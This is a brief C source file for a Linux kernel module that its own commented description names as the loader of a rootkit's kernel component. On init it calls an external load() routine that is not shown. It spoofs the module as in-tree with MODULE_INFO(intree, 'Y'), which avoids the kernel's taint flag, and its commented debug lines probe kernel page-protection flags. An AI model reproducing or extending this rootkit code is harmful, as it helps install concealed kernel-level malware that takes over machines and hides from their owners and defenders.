#include <linux/module.h>       /* Needed by all modules */
#include <linux/sched.h>

extern int load(void);

int init_module(void) {
	printk("hello!\n");
    //printk("__builtin_return_address(0) = %d\n", __builtin_return_address(0));
	//printk("PAGE_KERNEL_NOENC = %x\n", PAGE_KERNEL_NOENC);
	//printk("PAGE_KERNEL_EXEC_NOENC = %x\n", PAGE_KERNEL_EXEC_NOENC);
	return load();
}

void cleanup_module(void) {
}

MODULE_LICENSE("GPL");
MODULE_INFO(intree, "Y");
//MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
//MODULE_DESCRIPTION("This is the loader of the rootkit's kernel (kernel.c).");
